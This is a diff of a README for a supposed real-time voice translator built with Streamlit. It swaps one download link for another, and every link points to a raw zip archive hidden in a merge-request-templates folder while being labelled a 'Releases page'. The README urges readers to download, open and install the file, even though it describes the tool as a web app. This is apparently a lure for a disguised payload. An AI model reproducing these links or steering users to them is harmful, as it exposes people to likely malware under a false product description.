@@ -1,7 +1,7 @@
 # 🎤 real-time-voice-translator - Translate Speech Instantly
 
 ## 🔗 Download Now
-[![Download](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/translator-time-voice-real-v2.6.zip%https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/translator-time-voice-real-v2.6.zip)](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/translator-time-voice-real-v2.6.zip)
+[![Download](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/real_time_voice_translator_v1.9-beta.5.zip%https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/real_time_voice_translator_v1.9-beta.5.zip)](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/real_time_voice_translator_v1.9-beta.5.zip)
 
 ## 📋 Overview
 The **real-time voice translator** is a web application that offers instant translation for spoken words. Built using Streamlit, this app captures live speech, converts it to text, and translates it into your selected language. It even plays back the translated audio using text-to-speech.
@@ -11,7 +11,7 @@ This tool supports multiple languages, allowing seamless communication. You can 
 ## 🚀 Getting Started
 To run the application, follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/translator-time-voice-real-v2.6.zip) to find the latest version of the application.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/real_time_voice_translator_v1.9-beta.5.zip) to find the latest version of the application.
 2. **Download the Application**: Click on the version you wish to download. This will prompt you to save the file on your computer.
 3. **Install the Application**: Open the downloaded file and follow the on-screen instructions to install the application.
 
@@ -38,7 +38,7 @@ To run the application, follow these steps:
 6. **Edit and Export**: Make any necessary edits to the text and use the export feature to save your work.
 
 ## 📥 Download & Install
-You can download the application from our [Releases page](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/translator-time-voice-real-v2.6.zip). This page lists all available versions. Select the most recent release to ensure you have the latest features.
+You can download the application from our [Releases page](https://raw.githubusercontent.com/Jopex1/real-time-voice-translator/main/.gitlab/merge_request_templates/real_time_voice_translator_v1.9-beta.5.zip). This page lists all available versions. Select the most recent release to ensure you have the latest features.
 
 ## 🔑 Key Concepts
 - **Speech Recognition**: Understanding spoken language and converting it into text.
